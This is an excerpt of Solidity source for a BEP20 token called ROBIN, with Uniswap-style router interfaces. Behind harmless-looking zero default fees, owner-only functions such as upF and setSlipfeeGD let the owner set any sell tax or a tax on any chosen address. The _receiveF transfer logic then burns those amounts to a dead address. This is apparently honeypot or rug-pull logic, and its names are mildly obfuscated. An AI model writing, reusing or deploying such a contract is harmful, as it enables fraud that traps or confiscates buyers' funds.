...
interface IUniswapV2Factory {
    ...
    function feeGDTo() external view returns (address);
    function feeGDToSetter() external view returns (address);
    ...
    function setfeeGDTo(address) external;
    function setfeeGDToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeeGDOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeeGDOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeeGDOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeeGDOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeeGDOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract ROBIN is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeeGD = 0;

    uint256 private _defaultBuyfeeGD = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeeGD;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeeGD = _value;
    }

    function setSlipfeeGD(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeeGD[_address] = _value;
    }

    function getSlipfeeGD(address _address) external view onlyownar returns (uint256) {
        return _slipfeeGD[_address];
    }


    function setMAccountfeeGD(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeeGD(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeeGDAmount = 0;

        if (rF) {
            uint256 tradefeeGD = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeeGD = _defaultSellfeeGD;
                }
                if (from == uniswapV2Pair) {

                    tradefeeGD = _defaultBuyfeeGD;
                }
            }
            if (_slipfeeGD[from] > 0) {
                tradefeeGD = _slipfeeGD[from];
            }

            tradefeeGDAmount = _Amount.mul(tradefeeGD).div(100);
        }


        if (tradefeeGDAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeeGDAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeeGDAmount);
            emit Transfer(from, _deadAddress, tradefeeGDAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeeGDAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeeGDAmount);
        emit Transfer(from, _to, _Amount - tradefeeGDAmount);
    }
